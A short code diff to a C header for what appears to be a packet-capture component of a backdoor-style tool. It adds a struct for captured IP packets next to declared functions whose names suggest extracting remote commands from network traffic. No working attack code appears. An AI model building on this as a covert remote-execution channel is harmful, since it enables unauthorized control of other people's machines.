@@ -24,6 +24,15 @@
 #ifndef BOOPKIT_DPI_H
 #define BOOPKIT_DPI_H
 
+#define XCAP_BUFFER_SIZE 64
+
+typedef struct xcap_ip_packet {
+  int captured;
+  struct ip *iph;
+  unsigned char *packet;
+  struct pcap_pkthdr *header;
+} xcap_ip_packet;
+
 void *xcap(void *v_dev_name);
 int xcaprce(char search[INET_ADDRSTRLEN], char *rce);
 
